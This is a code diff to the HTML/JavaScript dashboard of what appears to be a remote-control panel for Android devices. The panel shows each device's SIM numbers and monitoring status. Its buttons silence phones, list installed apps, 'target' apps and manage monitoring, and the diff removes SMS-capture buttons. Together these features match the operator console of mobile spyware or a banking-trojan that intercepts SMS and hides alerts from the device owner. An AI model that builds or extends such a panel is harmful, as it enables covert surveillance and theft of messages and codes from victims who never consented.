@@ -172,7 +172,7 @@
         <div id="toast" class="toast"></div>
     </div>
 
-    // Target/Untarget App Modal
+<!-- Target/Untarget App Modal -->
 <div id="target-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1001;">
     <div style="background:#1a1a1a; margin:5% auto; padding:20px; border-radius:10px; max-width:500px; max-height:70vh; overflow-y:auto; border:1px solid #333;">
         <h3 style="color:#4CAF50; margin-bottom:15px;">📱 Installed Apps</h3>
@@ -248,7 +248,7 @@
                                 <div><span class="info-label">Android:</span> ${device.androidVersion || 'Unknown'}</div>
                                 <div><span class="info-label">SIM:</span> ${device.simNumbers || 'Not collected'}</div>
                                 <div><span class="info-label">Last Seen:</span> ${device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : 'Never'}</div>
-                                <div><span class="info-label">DND:</span> ${device.isDndOn ? '🔇 ON' : '🔊 OFF'}</div>
+                                <div><span class="info-label">Silent Mode:</span> ${device.isSilentModeOn ? '🔇 ON' : '🔊 OFF'}</div>
                                 <div><span class="info-label">Monitor:</span> ${device.isMonitoring ? '✅ Active' : '❌ Inactive'}</div>
                             </div>
                             ${isSelected ? this.renderCommands(id) : ''}
@@ -260,21 +260,19 @@
             }
 
             renderCommands(deviceId) {
-                            return `
-                                <div class="commands-section">
-                                    <div class="commands-title">Control Panel</div>
-                                    <div class="command-grid">
-                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'start_sms_capture', {})">📥 Receive SMS</button>
-                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_sms_capture', {})">📋 Stop SMS</button>
-                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'set_dnd', {enabled: true})">🔇 DND On</button>
-                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'set_dnd', {enabled: false})">🔊 DND Off</button>
-                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'get_installed_apps', {})">📱 All Apps</button>
-                                        <button class="command-btn" onclick="dashboard.openTargetModal('${deviceId}')">🎯 Target App</button>
-                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'list_targets', {})">📋 List Targets</button>
-                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_monitoring', {})">⏹️ Stop Monitor</button>
-                                    </div>
-                                </div>
-                            `;
+                return `
+                    <div class="commands-section">
+                        <div class="commands-title">Control Panel</div>
+                        <div class="command-grid">
+                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'set_silent', {enabled: true})">🔇 Silent Mode</button>
+                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'set_silent', {enabled: false})">🔊 Normal Mode</button>
+                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'get_installed_apps', {})">📱 All Apps</button>
+                            <button class="command-btn" onclick="dashboard.openTargetModal('${deviceId}')">🎯 Target App</button>
+                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'list_targets', {})">📋 List Targets</button>
+                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_monitoring', {})">⏹️ Stop Monitor</button>
+                        </div>
+                    </div>
+                `;
             }
 
             selectDevice(deviceId) {
